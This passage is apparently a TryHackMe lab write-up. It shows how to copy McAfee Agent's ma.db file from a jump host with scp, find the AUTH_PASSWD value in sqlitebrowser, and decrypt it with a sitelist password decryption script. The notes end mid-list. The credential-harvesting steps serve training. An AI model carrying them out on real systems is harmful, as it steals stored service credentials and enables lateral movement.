- There different software which use NTLM authentication to access data and run  
- In this room we will see McAfee.
- McAfee configuration file credentials can be found in ma.db (`C:/ProgramData/McAfee/Agent/DB/ma.db`)
- Downloaded this file from remote machine to local machine

```console
❯ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@thmjmp1.za.tryhackme.com's password:
ma.db                                                                                                                                                100%  118KB 142.9KB/s   00:00
```
- Opened this file with `sqlitebrowser`
- Found `AUTH_PASSWD` in Browse Data --> AGENT_REPOSITORIES.
- Saved this hash to machine.
- Used python script (`mcafeesitelistpwddecryption`) provided by the room author.

```
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```

- Executed this script
-
